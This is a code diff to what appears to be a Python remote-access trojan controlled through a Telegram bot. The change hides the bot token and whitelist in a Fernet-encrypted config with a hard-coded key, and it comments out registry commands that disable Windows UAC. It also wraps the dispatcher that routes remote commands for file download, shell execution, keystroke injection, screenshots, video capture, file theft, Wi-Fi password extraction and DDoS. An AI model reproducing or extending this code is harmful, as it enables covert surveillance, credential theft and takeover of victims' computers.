@@ -10,23 +10,42 @@ import pyautogui
 import keyboard
 import telebot
 import json as jsn
-
-with open("config.json", 'r', encoding='utf-8') as f:
-    data = jsn.load(f)
-
-if ctypes.windll.shell32.IsUserAnAdmin():
-    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
-    subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
-    subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+from cryptography.fernet import Fernet
 
 
+key = b'eMz2W5yric_QgW1AFy7zsKessRyykkBhmaZIp_ugv0E='
+# if ctypes.windll.shell32.IsUserAnAdmin():
+#     command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
+#     subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+#     command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
+#     subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+def read_config():
+    name_file = "config" 
+
+    f = Fernet(key)
+
+    with open(name_file, 'rb') as file:
+        data1 = file.read()
+
+    if len(data1.split()) > 1:
+
+        encrypted_text = f.encrypt(data1)
+        with open(name_file, 'wb') as file:
+            file.write(encrypted_text)
+
+    with open(name_file, 'rb') as file:
+        data2 = file.read()
+
+    return f.decrypt(data2).decode().split()
+
+decrypted_text = read_config()
 class Data:
-    id = data["white_list"]
-    update = data["update"]
-    name = data["name_pc"]
-    token = data["bot_token"]
-    uis = data["uis"]
+    name = decrypted_text[0]
+    token = decrypted_text[1]
+    id = [int(i) for i in decrypted_text[2][1:-1].split(',')] 
+    update = int(decrypted_text[3])
+    uis = int(decrypted_text[4])
 
 class Logger_Bot:
     def __init__(self) -> None:
@@ -417,85 +436,96 @@ sh.Run "{pth}\\upd.bat", 0'''
             bot.send_message(self.id, f'🖥❌ \n{e}')
 
     def perfor(self, text, id_chat):
-        self.id = id_chat
-        text = self.rasbiv(text)
-        name_pc = text["name"]
-        comnd = text["cmnd"]
-        text_comand = text["text"]
+        try:
+            self.id = id_chat
+            text = self.rasbiv(text)
+            name_pc = text["name"]
+            comnd = text["cmnd"]
+            text_comand = text["text"]
+            print(text_comand)
 
-        if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all":
-            if comnd == "wget":
-                self.wgt(text_comand)
+            if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all":
+                if comnd == "wget":
+                    self.wgt(text_comand)
 
-            if comnd == "ip" or comnd == "ipad":
-                self.ip_address()
+                if comnd == "ip" or comnd == "ipad":
+                    self.ip_address()
 
-            if comnd == "reboot":
-                self.rebooting(text_comand[0])
+                if comnd == "reboot":
+                    self.rebooting(text_comand[0])
 
-            if comnd == "specifications" or comnd == "spec":
-                self.specifications()
+                if comnd == "specifications" or comnd == "spec":
+                    self.specifications()
 
-            if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
-                self.shotdowning(text_comand[0])
+                if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
+                    self.shotdowning(text_comand[0])
 
-            if comnd == "picture" or comnd == "pict":
-                self.picture(text_comand[0])
+                if comnd == "picture" or comnd == "pict":
+                    self.picture(text_comand[0])
 
-            if comnd == "cmdi":
-                self.cmdi(text_comand[0])
+                if comnd == "cmdi":
+                    self.cmdi(text_comand[0])
 
-            if comnd == "cmdo":
-                self.cmdo(text_comand[0])
+                if comnd == "cmdo":
+                    self.cmdo(text_comand[0])
 
-            if comnd == "video" or comnd == "vide" or comnd == "vid":
-                self.video(text_comand[0])
+                if comnd == "video" or comnd == "vide" or comnd == "vid":
+                    self.video(text_comand[0])
 
-            if comnd == "exit" or comnd == "cls" or comnd == "clear":
-                self.exits()
+                if comnd == "exit" or comnd == "cls" or comnd == "clear":
+                    self.exits()
 
-            if comnd == "lock" or comnd == "close":
-                self.closes()
+                if comnd == "lock" or comnd == "close":
+                    self.closes()
 
-            if comnd == "keyb" or comnd == "keyboard":
-                self.keyb(text_comand[0])
+                if comnd == "keyb" or comnd == "keyboard":
+                    self.keyb(text_comand[0])
 
-            if comnd == "rask" or comnd == "layout":
-                self.rask()
+                if comnd == "rask" or comnd == "layout":
+                    self.rask()
 
-            if comnd == "dir" or comnd == "direction":
-                self.direct(text_comand[0])
+                if comnd == "dir" or comnd == "direction":
+                    self.direct(text_comand[0])
 
-            if comnd == "screenshot" or comnd == "scrn":
-                self.screenshot()
+                if comnd == "screenshot" or comnd == "scrn":
+                    self.screenshot()
 
-            if comnd == "inpt" or comnd == "input":
-                target = self.input_gui(text_comand[0])
+                if comnd == "inpt" or comnd == "input":
+                    target = self.input_gui(text_comand[0])
 
-            if comnd == "outp" or comnd == "output":
-                self.print_gui(text_comand[0])
+                if comnd == "outp" or comnd == "output":
+                    self.print_gui(text_comand[0])
 
-            if comnd == "start" or comnd == "strt":
-                self.start_file(text_comand[0])
+                if comnd == "start" or comnd == "strt":
+                    self.start_file(text_comand[0])
 
-            if comnd == "ddos" or comnd == "attack_for":
-                self.ddos(text_comand[0])
+                if comnd == "ddos" or comnd == "attack_for":
+                    self.ddos(text_comand[0])
 
-            if comnd == "browser" or comnd == "brws":
-                self.browser(text_comand[0])
+                if comnd == "browser" or comnd == "brws":
+                    self.browser(text_comand[0])
 
-            if comnd == "pull" or comnd == "pull_file":
-                self.pull_file(text_comand[0])
+                if comnd == "pull" or comnd == "pull_file":
+                    self.pull_file(text_comand[0])
 
-            if comnd == "wifi" or comnd == "extract_wifi_passwords":
-                self.extract_wifi_passwords()
+                if comnd == "wifi" or comnd == "extract_wifi_passwords":
+                    self.extract_wifi_passwords()
 
-            if comnd == "kill":
-                self.exits()
-                bot.stop_polling()
+                if comnd == "kill":
+                    self.exits()
+                    bot.stop_polling()
 
-            if comnd == "upd":
-                self.update_bot()
+                if comnd == "upd":
+                    self.update_bot()
+
+                else:
+                    bot.send_message(self.id, "🖥❌ Такой функции нет или допущена ошибка при её вводе")
+        except:
+            e = "Ошибка в ведённой команде"
+            logger.log(self.rasbiv.__name__,e)
+            bot.send_message(self.id, f'🖥❌ \n{e}')
+
+        
 
 
 func_api = Func_API()
